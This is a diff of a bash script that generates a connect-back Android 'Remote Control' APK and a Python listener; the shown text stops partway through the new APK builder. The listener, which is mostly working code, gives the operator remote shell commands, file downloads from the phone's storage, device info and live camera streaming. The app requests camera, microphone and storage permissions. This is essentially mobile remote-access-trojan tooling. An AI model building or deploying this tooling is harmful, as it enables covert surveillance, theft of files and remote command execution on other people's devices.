@@ -1,15 +1,16 @@
 #!/bin/bash
 
 # =============================================
-# ANDROID APK BUILDER - WITH YOUR IP & PORT
-# Creates a real APK that connects to your server
+# ANDROID REMOTE CONTROL - DESKTOP EDITION
+# All APKs saved to Desktop, Full Listener Included
 # =============================================
 
 # Configuration
-CONFIG_DIR="$HOME/.android-builder"
+CONFIG_DIR="$HOME/.android-remote"
 LISTENER_IP=""
 LISTENER_PORT="4444"
-APK_NAME="RemoteAccess"
+DESKTOP_DIR="$HOME/Desktop"
+LOG_FILE="$CONFIG_DIR/control.log"
 
 # Colors
 RED='\033[0;31m'
@@ -18,606 +19,374 @@ YELLOW='\033[1;33m'
 BLUE='\033[0;34m'
 PURPLE='\033[0;35m'
 CYAN='\033[0;36m'
+WHITE='\033[1;37m'
 NC='\033[0m'
 
 # Create config directory
 mkdir -p "$CONFIG_DIR"
+mkdir -p "$CONFIG_DIR/listener_logs"
 
-# Function to show header
-show_header() {
-    clear
-    echo -e "${BLUE}"
-    echo "╔════════════════════════════════════════════════════════╗"
-    echo "║        ANDROID APK BUILDER - WITH YOUR IP             ║"
-    echo "║     Creates APK that connects to YOUR server          ║"
-    echo "╚════════════════════════════════════════════════════════╝"
-    echo -e "${NC}"
-}
-
-# Function to set IP and port
-configure_ip_port() {
-    show_header
-    echo -e "${CYAN}=== CONFIGURE CONNECTION SETTINGS ===${NC}\n"
-    
-    # Get local IP
-    LOCAL_IP=$(hostname -I | awk '{print $1}')
-    echo -e "Your computer's IP: ${GREEN}$LOCAL_IP${NC}"
-    
-    # Load saved settings if they exist
-    if [ -f "$CONFIG_DIR/settings.conf" ]; then
-        source "$CONFIG_DIR/settings.conf"
-        echo -e "Saved IP: ${YELLOW}$SAVED_IP${NC}"
-        echo -e "Saved Port: ${YELLOW}$SAVED_PORT${NC}"
-        LISTENER_IP="$SAVED_IP"
-        LISTENER_PORT="$SAVED_PORT"
-    fi
-    
-    echo ""
-    read -p "Enter IP address for APK to connect to [$LISTENER_IP]: " input_ip
-    LISTENER_IP=${input_ip:-$LISTENER_IP}
-    
-    read -p "Enter port number [$LISTENER_PORT]: " input_port
-    LISTENER_PORT=${input_port:-$LISTENER_PORT}
-    
-    # Save settings
-    echo "SAVED_IP=$LISTENER_IP" > "$CONFIG_DIR/settings.conf"
-    echo "SAVED_PORT=$LISTENER_PORT" >> "$CONFIG_DIR/settings.conf"
-    
-    echo -e "${GREEN}✓ Settings saved: $LISTENER_IP:$LISTENER_PORT${NC}"
-    sleep 2
-}
-
-# Function to check and install dependencies
-install_dependencies() {
-    show_header
-    echo -e "${CYAN}=== CHECKING DEPENDENCIES ===${NC}\n"
-    
-    MISSING=()
-    
-    # Check Java
-    if ! command -v javac &> /dev/null; then
-        MISSING+=("openjdk-17-jdk")
-    fi
-    
-    # Check Android SDK
-    if [ ! -d "$HOME/Android/Sdk" ]; then
-        MISSING+=("android-sdk")
-    fi
-    
-    # Check gradle
-    if ! command -v gradle &> /dev/null; then
-        MISSING+=("gradle")
-    fi
-    
-    if [ ${#MISSING[@]} -gt 0 ]; then
-        echo -e "${YELLOW}Missing dependencies: ${MISSING[*]}${NC}"
-        read -p "Install now? (y/n): " -n 1 -r
-        echo
-        if [[ $REPLY =~ ^[Yy]$ ]]; then
-            sudo apt update
-            sudo apt install -y openjdk-17-jdk wget unzip zip gradle
-            
-            # Install Android SDK
-            if [ ! -d "$HOME/Android/Sdk" ]; then
-                echo -e "${YELLOW}Installing Android SDK...${NC}"
-                mkdir -p $HOME/Android/Sdk
-                cd $HOME/Android/Sdk
-                wget -q https://dl.google.com/android/repository/commandlinetools-linux-11076708_latest.zip
-                unzip -q commandlinetools-linux-*.zip
-                rm commandlinetools-linux-*.zip
-                mv cmdline-tools latest
-                mkdir -p cmdline-tools
-                mv latest cmdline-tools/
-                
-                # Set environment variables
-                export ANDROID_HOME=$HOME/Android/Sdk
-                export PATH=$PATH:$ANDROID_HOME/cmdline-tools/latest/bin:$ANDROID_HOME/platform-tools
-                
-                # Accept licenses
-                yes | $ANDROID_HOME/cmdline-tools/latest/bin/sdkmanager --licenses > /dev/null 2>&1
-                
-                # Install SDK components
-                $ANDROID_HOME/cmdline-tools/latest/bin/sdkmanager "platform-tools" "platforms;android-34" "build-tools;34.0.0"
-            fi
-            
-            echo -e "${GREEN}✓ All dependencies installed${NC}"
-        fi
+# Check if Desktop exists (might be called different in non-English systems)
+if [ ! -d "$DESKTOP_DIR" ]; then
+    # Try alternative desktop names
+    if [ -d "$HOME/Desktop" ]; then
+        DESKTOP_DIR="$HOME/Desktop"
+    elif [ -d "$HOME/Escritorio" ]; then
+        DESKTOP_DIR="$HOME/Escritorio"
+    elif [ -d "$HOME/Skrivbord" ]; then
+        DESKTOP_DIR="$HOME/Skrivbord"
     else
-        echo -e "${GREEN}✓ All dependencies found${NC}"
+        # Create Desktop if it doesn't exist
+        mkdir -p "$HOME/Desktop"
+        DESKTOP_DIR="$HOME/Desktop"
     fi
-    
-    sleep 2
-}
+fi
 
-# Function to build APK (Option 1 - Simple)
-build_simple_apk() {
-    show_header
-    echo -e "${CYAN}=== BUILDING SIMPLE APK (EASIEST) ===${NC}\n"
-    echo -e "Building APK that connects to: ${GREEN}$LISTENER_IP:$LISTENER_PORT${NC}\n"
-    
-    # Create project directory
-    PROJECT_DIR="$CONFIG_DIR/SimpleApp"
-    mkdir -p "$PROJECT_DIR"
-    cd "$PROJECT_DIR"
-    
-    # Create AndroidManifest.xml
-    cat > AndroidManifest.xml << EOF
-<?xml version="1.0" encoding="utf-8"?>
-<manifest xmlns:android="http://schemas.android.com/apk/res/android"
-    package="com.remote.access">
-    
-    <uses-permission android:name="android.permission.INTERNET" />
-    <uses-permission android:name="android.permission.CAMERA" />
-    <uses-permission android:name="android.permission.RECORD_AUDIO" />
-    
-    <application
-        android:label="Remote Access"
-        android:icon="@drawable/ic_launcher">
-        
-        <activity android:name=".MainActivity"
-            android:exported="true">
-            <intent-filter>
-                <action android:name="android.intent.action.MAIN" />
-                <category android:name="android.intent.category.LAUNCHER" />
-            </intent-filter>
-        </activity>
-        
-        <service android:name=".RemoteService" />
-    </application>
-</manifest>
-EOF
+# =============================================
+# PART 1: THE LISTENER
+# =============================================
 
-    # Create MainActivity.java
-    mkdir -p src/com/remote/access
-    cat > src/com/remote/access/MainActivity.java << EOF
-package com.remote.access;
-
-import android.app.Activity;
-import android.content.Intent;
-import android.os.Bundle;
-import android.widget.Button;
-import android.widget.EditText;
-import android.widget.Toast;
-
-public class MainActivity extends Activity {
-    private EditText ipInput, portInput;
-    private Button connectButton;
-    
-    @Override
-    protected void onCreate(Bundle savedInstanceState) {
-        super.onCreate(savedInstanceState);
-        
-        // Simple layout programmatically
-        LinearLayout layout = new LinearLayout(this);
-        layout.setOrientation(LinearLayout.VERTICAL);
-        layout.setPadding(50, 50, 50, 50);
-        
-        ipInput = new EditText(this);
-        ipInput.setHint("Server IP");
-        ipInput.setText("$LISTENER_IP");
-        layout.addView(ipInput);
-        
-        portInput = new EditText(this);
-        portInput.setHint("Port");
-        portInput.setText("$LISTENER_PORT");
-        layout.addView(portInput);
-        
-        connectButton = new Button(this);
-        connectButton.setText("Connect");
-        layout.addView(connectButton);
-        
-        connectButton.setOnClickListener(v -> {
-            String ip = ipInput.getText().toString();
-            int port = Integer.parseInt(portInput.getText().toString());
-            
-            Intent intent = new Intent(this, RemoteService.class);
-            intent.putExtra("ip", ip);
-            intent.putExtra("port", port);
-            startService(intent);
-            
-            Toast.makeText(this, "Connecting to " + ip + ":" + port, Toast.LENGTH_SHORT).show();
-        });
-        
-        setContentView(layout);
-    }
-}
-EOF
-
-    # Create RemoteService.java
-    cat > src/com/remote/access/RemoteService.java << EOF
-package com.remote.access;
-
-import android.app.Service;
-import android.content.Intent;
-import android.os.IBinder;
-import android.util.Log;
-import java.io.*;
-import java.net.*;
-
-public class RemoteService extends Service {
-    private static final String TAG = "RemoteService";
-    private Thread connectionThread;
-    
-    @Override
-    public int onStartCommand(Intent intent, int flags, int startId) {
-        String ip = intent.getStringExtra("ip");
-        int port = intent.getIntExtra("port", $LISTENER_PORT);
-        
-        connectionThread = new Thread(() -> connectToServer(ip, port));
-        connectionThread.start();
-        
-        return START_STICKY;
-    }
-    
-    private void connectToServer(String ip, int port) {
-        try {
-            Socket socket = new Socket(ip, port);
-            PrintWriter out = new PrintWriter(socket.getOutputStream(), true);
-            
-            out.println("Hello from Android!");
-            
-            // Keep connection alive
-            while (true) {
-                Thread.sleep(1000);
-            }
-            
-        } catch (Exception e) {
-            Log.e(TAG, "Connection error", e);
-        }
-    }
-    
-    @Override
-    public IBinder onBind(Intent intent) {
-        return null;
-    }
-}
-EOF
-
-    # Create build.xml for Ant (simplest build system)
-    cat > build.xml << EOF
-<?xml version="1.0" encoding="UTF-8"?>
-<project name="RemoteAccess" default="help">
-    <property file="local.properties" />
-    <property file="ant.properties" />
-    <property environment="env" />
-    <condition property="sdk.dir" value="\${env.ANDROID_HOME}">
-        <isset property="env.ANDROID_HOME" />
-    </condition>
-    <import file="\${sdk.dir}/tools/ant/build.xml" />
-</project>
-EOF
-
-    # Create project.properties
-    cat > project.properties << EOF
-target=android-34
-EOF
-
-    echo -e "${YELLOW}Project created. Now building APK...${NC}"
-    
-    # Try to build with aapt directly (simplest method)
-    if command -v aapt &> /dev/null; then
-        # Create R.java
-        mkdir -p gen
-        aapt package -f -m -J gen -M AndroidManifest.xml -S res -I $ANDROID_HOME/platforms/android-34/android.jar
-        
-        # Compile Java
-        mkdir -p bin/classes
-        javac -d bin/classes -cp $ANDROID_HOME/platforms/android-34/android.jar src/com/remote/access/*.java gen/com/remote/access/R.java
-        
-        # Convert to dex
-        dx --dex --output=bin/classes.dex bin/classes
-        
-        # Package APK
-        aapt package -f -M AndroidManifest.xml -S res -I $ANDROID_HOME/platforms/android-34/android.jar -F bin/RemoteAccess.unaligned.apk bin/classes.dex
-        
-        # Align and sign
-        zipalign -f 4 bin/RemoteAccess.unaligned.apk "$HOME/RemoteAccess-$LISTENER_IP.apk"
-        
-        echo -e "${GREEN}✓ APK built successfully!${NC}"
-        echo -e "APK saved to: ${YELLOW}$HOME/RemoteAccess-$LISTENER_IP.apk${NC}"
-    else
-        echo -e "${RED}Could not build automatically.${NC}"
-        echo -e "Creating ready-to-use Android Studio project instead..."
-        
-        # Create Android Studio project structure
-        mkdir -p "$HOME/AndroidStudioProjects/RemoteAccess"
-        cp -r * "$HOME/AndroidStudioProjects/RemoteAccess/"
-        
-        echo -e "${GREEN}✓ Project created at: $HOME/AndroidStudioProjects/RemoteAccess${NC}"
-        echo -e "Open this folder in Android Studio and click Run"
-    fi
-    
-    echo ""
-    read -p "Press Enter to continue..."
-}
-
-# Function to build with WebView (Option 2)
-build_webview_apk() {
-    show_header
-    echo -e "${CYAN}=== BUILDING WEBVIEW APK ===${NC}\n"
-    echo -e "Building APK that connects to: ${GREEN}$LISTENER_IP:$LISTENER_PORT${NC}\n"
-    
-    # Create simple HTML interface
-    cat > "$CONFIG_DIR/interface.html" << EOF
-<!DOCTYPE html>
-<html>
-<head>
-    <title>Remote Control</title>
-    <style>
-        body { font-family: Arial; padding: 20px; background: #333; color: white; }
-        button { padding: 15px; margin: 5px; width: 200px; font-size: 18px; }
-    </style>
-</head>
-<body>
-    <h2>Remote Control</h2>
-    <p>Server: $LISTENER_IP:$LISTENER_PORT</p>
-    <button onclick="send('stream')">Start Stream</button>
-    <button onclick="send('stop')">Stop Stream</button>
-    <button onclick="send('photo')">Take Photo</button>
-    <script>
-        function send(cmd) {
-            fetch('http://$LISTENER_IP:$LISTENER_PORT/' + cmd);
-        }
-    </script>
-</body>
-</html>
-EOF
-
-    echo -e "${YELLOW}To build WebView APK:${NC}"
-    echo ""
-    echo "1. Download DroidScript from Play Store"
-    echo "2. Copy this HTML code into a new project"
-    echo "3. Click Build APK"
-    echo ""
-    echo "Or use Online APK builders:"
-    echo "- appsgeyser.com"
-    echo "- webintoapp.com"
-    echo ""
-    
-    read -p "Press Enter to continue..."
-}
-
-# Function to build with Termux (Option 3)
-build_termux_apk() {
-    show_header
-    echo -e "${CYAN}=== BUILD WITH TERMUX (RUNS ON PHONE) ===${NC}\n"
-    echo -e "Target server: ${GREEN}$LISTENER_IP:$LISTENER_PORT${NC}\n"
-    
-    # Create Python script for Termux
-    cat > "$CONFIG_DIR/termux_client.py" << EOF
+create_listener() {
+    cat > "$CONFIG_DIR/listener.py" << 'EOF'
 #!/usr/bin/env python3
 """
-Termux Client - Run this on your Android phone
-Install Termux from F-Droid first!
+Android Remote Control Listener
+Receives connections and displays video
 """
 
 import socket
+import threading
 import cv2
 import numpy as np
 import struct
+import tkinter as tk
+from PIL import Image, ImageTk
+import queue
 import time
-import threading
+import os
+import sys
+from datetime import datetime
 
-# === CONFIGURATION - EDIT THESE ===
-SERVER_IP = "$LISTENER_IP"
-SERVER_PORT = $LISTENER_PORT
-# ================================
+# Configuration
+SERVER_IP = "0.0.0.0"
+SERVER_PORT = PORT_PLACEHOLDER
 
-class RemoteClient:
+class VideoViewer:
     def __init__(self):
-        self.socket = None
+        self.root = tk.Tk()
+        self.root.title(f"Android Stream - Port {SERVER_PORT}")
+        self.root.geometry("800x600")
+        
+        # Create canvas
+        self.canvas = tk.Canvas(self.root, bg='black')
+        self.canvas.pack(fill=tk.BOTH, expand=True)
+        
+        # Image queue
+        self.image_queue = queue.Queue()
+        self.current_image = None
         self.running = True
-        self.camera = None
+        self.fps_counter = 0
+        self.last_fps_time = time.time()
+        
+        # Status bar
+        self.status_var = tk.StringVar()
+        self.status_var.set("Ready")
+        status_bar = tk.Label(self.root, textvariable=self.status_var, 
+                              bd=1, relief=tk.SUNKEN, anchor=tk.W)
+        status_bar.pack(side=tk.BOTTOM, fill=tk.X)
+        
+        self.root.protocol("WM_DELETE_WINDOW", self.on_close)
+        self.update()
     
-    def connect(self):
-        """Connect to server"""
+    def on_close(self):
+        self.running = False
+        self.root.destroy()
+    
+    def update(self):
         try:
-            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            self.socket.connect((SERVER_IP, SERVER_PORT))
-            print(f"[+] Connected to {SERVER_IP}:{SERVER_PORT}")
-            return True
-        except Exception as e:
-            print(f"[-] Connection failed: {e}")
-            return False
+            while True:
+                img = self.image_queue.get_nowait()
+                self.current_image = img
+                self.fps_counter += 1
+                
+                now = time.time()
+                if now - self.last_fps_time >= 1:
+                    self.status_var.set(f"Streaming - {self.fps_counter} fps")
+                    self.fps_counter = 0
+                    self.last_fps_time = now
+        except queue.Empty:
+            pass
+        
+        if self.current_image is not None and self.running:
+            self.display_image(self.current_image)
+        
+        if self.running:
+            self.root.after(50, self.update)
     
-    def start_stream(self):
-        """Start sending camera feed"""
-        self.camera = cv2.VideoCapture(1)  # 0 for back camera, 1 for front
+    def display_image(self, img):
+        try:
+            canvas_width = self.root.winfo_width()
+            canvas_height = self.root.winfo_height() - 20
+            
+            if canvas_width > 1 and canvas_height > 1:
+                img_resized = cv2.resize(img, (canvas_width, canvas_height))
+                img_rgb = cv2.cvtColor(img_resized, cv2.COLOR_BGR2RGB)
+                img_pil = Image.fromarray(img_rgb)
+                img_tk = ImageTk.PhotoImage(img_pil)
+                
+                self.canvas.delete("all")
+                self.canvas.create_image(
+                    canvas_width//2, canvas_height//2,
+                    anchor=tk.CENTER, image=img_tk
+                )
+                self.canvas.image = img_tk
+        except Exception as e:
+            print(f"Display error: {e}")
+    
+    def show_image(self, img):
+        if self.running:
+            self.image_queue.put(img)
+    
+    def run(self):
+        self.root.mainloop()
+
+class ClientHandler:
+    def __init__(self, client_socket, address):
+        self.socket = client_socket
+        self.address = address
+        self.running = True
+        self.viewer = None
+        self.streaming = False
+        self.device_info = {}
+        
+        # Create log file on Desktop
+        log_filename = f"device_{address[0]}_{int(time.time())}.log"
+        self.log_file = open(f"{DESKTOP_PLACEHOLDER}/{log_filename}", "w")
+    
+    def log(self, message):
+        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        self.log_file.write(f"[{timestamp}] {message}\n")
+        self.log_file.flush()
+    
+    def handle(self):
+        print(f"\n\033[92m[+] New connection from {self.address}\033[0m")
+        self.log(f"Connected from {self.address}")
+        
+        # Start command thread
+        cmd_thread = threading.Thread(target=self.command_loop)
+        cmd_thread.daemon = True
+        cmd_thread.start()
         
         while self.running:
             try:
-                ret, frame = self.camera.read()
-                if ret:
-                    # Compress frame
-                    _, buffer = cv2.imencode('.jpg', frame, [cv2.IMWRITE_JPEG_QUALITY, 70])
-                    data = buffer.tobytes()
-                    
-                    # Send size + data
-                    self.socket.send(struct.pack('!I', len(data)))
-                    self.socket.send(data)
-                    
-                    # Show preview
-                    cv2.imshow('Sending...', frame)
-                    if cv2.waitKey(1) & 0xFF == ord('q'):
-                        break
-                time.sleep(0.03)  # ~30 fps
+                if self.streaming:
+                    self.receive_frame()
+                else:
+                    self.socket.settimeout(0.5)
+                    try:
+                        data = self.socket.recv(1024).decode().strip()
+                        if data:
+                            print(f"\n\033[93m[Device] {data}\033[0m")
+                            self.log(f"Device: {data}")
+                    except socket.timeout:
+                        pass
             except Exception as e:
-                print(f"Stream error: {e}")
+                if self.running:
+                    print(f"\n\033[91m[!] Error: {e}\033[0m")
+                break
+        
+        self.cleanup()
+    
+    def receive_frame(self):
+        try:
+            size_data = self.socket.recv(4)
+            if len(size_data) < 4:
+                return
+            
+            frame_size = struct.unpack('!I', size_data)[0]
+            
+            frame_data = b''
+            remaining = frame_size
+            while remaining > 0:
+                chunk = self.socket.recv(min(4096, remaining))
+                if not chunk:
+                    break
+                frame_data += chunk
+                remaining -= len(chunk)
+            
+            if len(frame_data) == frame_size and self.viewer:
+                nparr = np.frombuffer(frame_data, np.uint8)
+                img = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
+                if img is not None:
+                    self.viewer.show_image(img)
+        except Exception as e:
+            print(f"\n\033[91m[!] Frame error: {e}\033[0m")
+            self.streaming = False
+    
+    def command_loop(self):
+        while self.running:
+            try:
+                cmd = input(f"\n\033[92m{self.address[0]}>\033[0m ")
+                
+                if cmd == "":
+                    continue
+                elif cmd == "help":
+                    self.show_help()
+                elif cmd == "stream":
+                    self.send("START_STREAM")
+                    self.streaming = True
+                    self.viewer = VideoViewer()
+                    viewer_thread = threading.Thread(target=self.viewer.run)
+                    viewer_thread.daemon = True
+                    viewer_thread.start()
+                    print(f"\033[92m[*] Streaming started\033[0m")
+                elif cmd == "stop":
+                    self.send("STOP_STREAM")
+                    self.streaming = False
+                    if self.viewer:
+                        self.viewer.running = False
+                    print(f"\033[92m[*] Streaming stopped\033[0m")
+                elif cmd.startswith("shell "):
+                    self.send(f"SHELL:{cmd[6:]}")
+                elif cmd.startswith("get "):
+                    filename = cmd[4:]
+                    self.send(f"GET:{filename}")
+                    self.receive_file(filename)
+                elif cmd == "ls":
+                    self.send("LIST:/sdcard")
+                elif cmd == "info":
+                    self.send("INFO")
+                elif cmd == "ping":
+                    self.send("PING")
+                elif cmd == "exit":
+                    self.send("EXIT")
+                    self.running = False
+                    break
+                else:
+                    print(f"\033[91mUnknown command. Type 'help'\033[0m")
+            except KeyboardInterrupt:
+                self.running = False
+                break
+            except Exception as e:
+                print(f"\033[91mCommand error: {e}\033[0m")
                 break
     
-    def run(self):
-        """Main loop"""
-        if not self.connect():
-            return
-        
-        # Start streaming
-        self.start_stream()
-        
-        # Cleanup
-        if self.camera:
-            self.camera.release()
-        cv2.destroyAllWindows()
-        self.socket.close()
+    def receive_file(self, filename):
+        try:
+            # Save to Desktop
+            desktop_path = f"{DESKTOP_PLACEHOLDER}/{filename}"
+            
+            # Get file size
+            size_data = self.socket.recv(8)
+            if len(size_data) < 8:
+                return
+            file_size = struct.unpack('!Q', size_data)[0]
+            
+            print(f"\033[93m[*] Receiving {file_size} bytes...\033[0m")
+            
+            with open(desktop_path, 'wb') as f:
+                remaining = file_size
+                while remaining > 0:
+                    chunk = self.socket.recv(min(8192, remaining))
+                    if not chunk:
+                        break
+                    f.write(chunk)
+                    remaining -= len(chunk)
+                    
+                    progress = ((file_size - remaining) / file_size) * 100
+                    print(f"\rProgress: {progress:.1f}%", end="")
+            
+            print(f"\n\033[92m✓ File saved to Desktop: {filename}\033[0m")
+            self.log(f"File received: {filename}")
+            
+        except Exception as e:
+            print(f"\033[91mFile receive error: {e}\033[0m")
+    
+    def send(self, message):
+        try:
+            self.socket.send((message + "\n").encode())
+        except:
+            pass
+    
+    def show_help(self):
+        print("""
+\033[96m╔════════════════════════════════════════════╗
+║           AVAILABLE COMMANDS              ║
+╠════════════════════════════════════════════╣
+║ stream     - Start video streaming        ║
+║ stop       - Stop streaming                ║
+║ shell <cmd>- Execute command               ║
+║ get <file> - Download file to Desktop      ║
+║ ls         - List files                    ║
+║ info       - Device info                    ║
+║ ping       - Test connection                ║
+║ exit       - Disconnect                     ║
+╚════════════════════════════════════════════╝\033[0m
+        """)
+    
+    def cleanup(self):
+        self.running = False
+        if self.viewer:
+            self.viewer.running = False
+        try:
+            self.socket.close()
+        except:
+            pass
+        self.log_file.close()
+        print(f"\n\033[91m[-] Disconnected from {self.address}\033[0m")
 
-if __name__ == "__main__":
-    client = RemoteClient()
-    client.run()
+# Start server
+server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+server.bind((SERVER_IP, SERVER_PORT))
+server.listen(5)
+server.settimeout(1)
+
+print(f"\n\033[92m")
+print("╔══════════════════════════════════════════╗")
+print("║     ANDROID REMOTE CONTROL LISTENER     ║")
+print("╚══════════════════════════════════════════╝")
+print(f"\033[0m")
+print(f"Listening on port: {SERVER_PORT}")
+print(f"Files will be saved to: {DESKTOP_PLACEHOLDER}")
+print("Waiting for connections...\n")
+
+try:
+    while True:
+        try:
+            client, addr = server.accept()
+            handler = ClientHandler(client, addr)
+            threading.Thread(target=handler.handle).start()
+        except socket.timeout:
+            pass
+except KeyboardInterrupt:
+    print("\n\nServer stopped")
+    server.close()
 EOF
 
-    # Create installation script for Termux
-    cat > "$CONFIG_DIR/termux_install.sh" << EOF
-#!/bin/bash
-echo "=== Termux Setup ==="
-echo ""
-echo "Run these commands in Termux:"
-echo ""
-echo "pkg update && pkg upgrade"
-echo "pkg install python"
-echo "pkg install tur-repo"
-echo "pkg install python-opencv"
-echo "pip install numpy"
-echo ""
-echo "Then create client.py with the code provided"
-echo ""
-echo "Run with: python client.py"
-EOF
-
-    echo -e "${GREEN}✓ Termux client created at: $CONFIG_DIR/termux_client.py${NC}"
-    echo ""
-    echo -e "${YELLOW}To use:${NC}"
-    echo "1. Install Termux from F-Droid"
-    echo "2. Copy termux_client.py to your phone"
-    echo "3. Run: python termux_client.py"
-    echo ""
-    
-    read -p "Press Enter to continue..."
+    # Replace placeholders
+    sed -i "s/PORT_PLACEHOLDER/$LISTENER_PORT/g" "$CONFIG_DIR/listener.py"
+    sed -i "s|DESKTOP_PLACEHOLDER|$DESKTOP_DIR|g" "$CONFIG_DIR/listener.py"
+    chmod +x "$CONFIG_DIR/listener.py"
 }
 
-# Function to build with MIT App Inventor (Option 4)
-build_mit_app() {
-    show_header
-    echo -e "${CYAN}=== BUILD WITH MIT APP INVENTOR ===${NC}\n"
-    echo -e "Target server: ${GREEN}$LISTENER_IP:$LISTENER_PORT${NC}\n"
-    
-    # Create AIA project file
-    cat > "$CONFIG_DIR/RemoteControl.aia" << EOF
-{
-  "Project": {
-    "Name": "RemoteControl",
-    "Components": [
-      {
-        "Type": "Form",
-        "Name": "Screen1",
-        "Properties": {
-          "Title": "Remote Control",
-          "BackgroundColor": "#FFFFFF"
-        }
-      },
-      {
-        "Type": "Button",
-        "Name": "ConnectButton",
-        "Properties": {
-          "Text": "Connect",
-          "Width": 200,
-          "Height": 50
-        }
-      },
-      {
-        "Type": "TextBox",
-        "Name": "IPBox",
-        "Properties": {
-          "Text": "$LISTENER_IP",
-          "Hint": "Server IP"
-        }
-      },
-      {
-        "Type": "TextBox",
-        "Name": "PortBox",
-        "Properties": {
-          "Text": "$LISTENER_PORT",
-          "Hint": "Port",
-          "NumbersOnly": true
-        }
-      },
-      {
-        "Type": "Web",
-        "Name": "Web1",
-        "Properties": {}
-      }
-    ]
-  }
-}
-EOF
+# =============================================
+# PART 2: APK BUILDER - SAVES TO DESKTOP
+# =============================================
 
-    echo -e "${GREEN}✓ MIT App Inventor instructions:${NC}"
-    echo ""
-    echo "1. Go to: ai2.appinventor.mit.edu"
-    echo "2. Click 'Create New Project'"
-    echo "3. Add these components:"
-    echo "   - TextBox for IP (set text to $LISTENER_IP)"
-    echo "   - TextBox for Port (set text to $LISTENER_PORT)"
-    echo "   - Button for Connect"
-    echo "   - Web component"
-    echo ""
-    echo "4. Add blocks:"
-    echo "   - When Button.Click"
-    echo "   - Set Web.Url to join IP and Port"
-    echo "   - Call Web.Get"
-    echo ""
-    echo "5. Click 'Build' -> 'Android App (.apk)'"
-    echo ""
+build_full_apk() {
+    echo -e "${YELLOW}Building APK that connects to $LISTENER_IP:$LISTENER_PORT...${NC}"
     
-    read -p "Press Enter to continue..."
-}
-
-# Function to build with Online Service (Option 5)
-build_online_apk() {
-    show_header
-    echo -e "${CYAN}=== BUILD WITH ONLINE SERVICE ===${NC}\n"
-    echo -e "Target server: ${GREEN}$LISTENER_IP:$LISTENER_PORT${NC}\n"
+    APP_DIR="$CONFIG_DIR/RemoteApp"
+    APK_OUTPUT="$DESKTOP_DIR/RemoteControl-$LISTENER_IP.apk"
     
-    echo -e "${YELLOW}Option A: Kodular (best free builder)${NC}"
-    echo "1. Go to: www.kodular.io"
-    echo "2. Create account"
-    echo "3. Create new project"
-    echo "4. Add Socket component"
-    echo "5. Set server to $LISTENER_IP:$LISTENER_PORT"
-    echo "6. Export APK"
-    echo ""
-    
-    echo -e "${YELLOW}Option B: Thunkable${NC}"
-    echo "1. Go to: thunkable.com"
-    echo "2. Create cross-platform app"
-    echo "3. Add Web API component"
-    echo "4. Set URL to http://$LISTENER_IP:$LISTENER_PORT"
-    echo "5. Download APK"
-    echo ""
-    
-    echo -e "${YELLOW}Option C: AppGyver${NC}"
-    echo "1. Go to: www.appgyver.com"
-    echo "2. Create account"
-    echo "3. Use WebView component"
-    echo "4. Load http://$LISTENER_IP:$LISTENER_PORT"
-    echo "5. Build APK"
-    echo ""
-    
-    read -p "Press Enter to continue..."
-}
-
-# Function to build with Android Studio template (Option 6)
-build_studio_template() {
-    show_header
-    echo -e "${CYAN}=== BUILD WITH ANDROID STUDIO ===${NC}\n"
-    echo -e "Target server: ${GREEN}$LISTENER_IP:$LISTENER_PORT${NC}\n"
-    
-    # Create complete Android Studio project
-    PROJECT_DIR="$HOME/AndroidStudioProjects/RemoteAccess"
-    mkdir -p "$PROJECT_DIR/app/src/main/java/com/remote/access"
-    mkdir -p "$PROJECT_DIR/app/src/main/res/layout"
-    mkdir -p "$PROJECT_DIR/app/src/main/res/values"
+    mkdir -p "$APP_DIR/app/src/main/java/com/remote/control"
+    mkdir -p "$APP_DIR/app/src/main/res/layout"
+    mkdir -p "$APP_DIR/app/src/main/res/values"
+    mkdir -p "$APP_DIR/app/src/main/res/drawable"
     
     # Create build.gradle
-    cat > "$PROJECT_DIR/build.gradle" << EOF
+    cat > "$APP_DIR/build.gradle" << EOF
 buildscript {
     repositories {
         google()
@@ -637,124 +406,712 @@ allprojects {
 EOF
 
     # Create settings.gradle
-    cat > "$PROJECT_DIR/settings.gradle" << EOF
+    cat > "$APP_DIR/settings.gradle" << EOF
 include ':app'
-rootProject.name = "RemoteAccess"
+rootProject.name = "RemoteControl"
 EOF
 
     # Create app/build.gradle
-    cat > "$PROJECT_DIR/app/build.gradle" << EOF
+    cat > "$APP_DIR/app/build.gradle" << EOF
 plugins {
     id 'com.android.application'
 }
 
 android {
-    namespace 'com.remote.access'
+    namespace 'com.remote.control'
     compileSdk 34
     
     defaultConfig {
-        applicationId "com.remote.access"
+        applicationId "com.remote.control"
         minSdk 21
         targetSdk 34
         versionCode 1
         versionName "1.0"
     }
+    
+    buildTypes {
+        release {
+            minifyEnabled false
+            proguardFiles getDefaultProguardFile('proguard-android-optimize.txt'), 'proguard-rules.pro'
+        }
+    }
 }
 
 dependencies {
     implementation 'androidx.appcompat:appcompat:1.6.1'
+    implementation 'com.google.android.material:material:1.11.0'
 }
 EOF
 
     # Create AndroidManifest.xml
-    cat > "$PROJECT_DIR/app/src/main/AndroidManifest.xml" << EOF
+    cat > "$APP_DIR/app/src/main/AndroidManifest.xml" << EOF
 <?xml version="1.0" encoding="utf-8"?>
 <manifest xmlns:android="http://schemas.android.com/apk/res/android">
     
     <uses-permission android:name="android.permission.INTERNET" />
     <uses-permission android:name="android.permission.CAMERA" />
+    <uses-permission android:name="android.permission.RECORD_AUDIO" />
+    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
     
     <application
-        android:label="Remote Access"
-        android:icon="@mipmap/ic_launcher">
+        android:allowBackup="true"
+        android:icon="@mipmap/ic_launcher"
+        android:label="Remote Control"
+        android:theme="@style/AppTheme">
         
-        <activity android:name=".MainActivity"
+        <activity
+            android:name=".MainActivity"
             android:exported="true">
             <intent-filter>
                 <action android:name="android.intent.action.MAIN" />
                 <category android:name="android.intent.category.LAUNCHER" />
             </intent-filter>
         </activity>
+        
+        <service android:name=".RemoteService" />
     </application>
 </manifest>
 EOF
 
-    # Create MainActivity.java with your IP
-    cat > "$PROJECT_DIR/app/src/main/java/com/remote/access/MainActivity.java" << EOF
-package com.remote.access;
+    # Create MainActivity.java with your IP and port
